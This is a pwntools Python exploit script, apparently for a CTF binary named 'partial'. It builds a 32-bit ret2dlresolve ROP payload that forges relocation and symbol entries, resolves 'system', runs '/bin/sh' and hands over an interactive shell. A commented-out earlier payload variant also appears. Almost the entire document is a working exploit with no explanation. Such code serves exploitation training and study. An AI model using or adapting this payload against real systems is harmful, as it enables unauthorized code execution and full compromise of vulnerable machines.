#!/usr/bin/env python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./partial')
elf = ELF('./partial')

read_plt = elf.plt['read']
memcpy_plt = elf.plt['memcpy']
gmon_start_plt = elf.plt['__gmon_start__']
plt0 = 0x8048300
got1 = 0x804a004

buf = 0x804a060
# 0x080482f5 : pop ebx ; ret
# 0x080484fe : pop edi ; pop ebp ; ret
# 0x080484fd : pop esi ; pop edi ; pop ebp ; ret
pop1_ret = 0x080482f5
pop2_ret = 0x080484fe
pop3_ret = 0x080484fd

# readelf -a ./partial | grep .dynamic
#   [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
dynamic = 0x08049f14
# readelf -a ./partial | grep .rel.plt
#   [10] .rel.plt          REL             080482b4 0002b4 000020 08   A  5  12  4
relplt = 0x080482b4
# readelf -a ./partial | grep SYMTAB
#  0x00000006 (SYMTAB)                     0x80481cc
dynsym = 0x80481cc
# readelf -a ./partial | grep STRTAB
#  0x00000005 (STRTAB)                     0x804822c
dynstr = 0x804822c

#gdb.attach(p, 'b *0x804849a\nb *0x080484fd\nc')

'''
payload = (
	((
		'A' * 18 + # padding
		p32(buf + 1024 + 4) # set esp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		p32(plt0) +
		p32(buf + 2048 - relplt) + # set reloc_arg=buf+2048
		p32(0xdeadbeef) +
		p32(buf + 2048 + 36)
	).ljust(2048, '\x00') + # buf+2048
	# Elf32_Rel
	p32(buf) + # r_offset
	p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) << 8)) + # r_info
	p32(0) + # padding
	# Elf32_Sym <= buf+2048+12
	p32(buf + 2048 + 28 - dynstr) + # st_name
	p32(0) + # st_value
	p32(0) + # st_size
	p32(0x12) + # st_info
	# buf+2048+28
	'system\x00\x00' +
	'/bin/sh\x00'
)
p.sendline(payload)
'''

def memcpy(dst, src, length):
	return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)

st_name = 0x38
payload = (
	((
		'A' * 18 + # padding
		p32(buf + 1024 + 4) # set esp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		memcpy(buf + 1024 + 32, got1, 4) + # buf+1024+20
		memcpy(buf, 0, 56) + # buf+1024+40
		memcpy(buf + 52, buf + 2048, 4) + # buf+1024+60
		memcpy(buf + 1024 + 88, got1, 4) + # buf+1024+80
		memcpy(0, buf, 56) + # buf+1024+100
		p32(gmon_start_plt) + p32(0xdeadbeef) + p32(buf + 2048 + 20)
	).ljust(2048, '\x00') + # buf+2048
	p32(buf + 2048 + 4) +
	p32(5) +
	p32(buf + 2048 + 12 - st_name) +
	# buf+2048+12
	'system\x00\x00' +
	'/bin/sh\x00'
)
p.sendline(payload)

p.interactive()

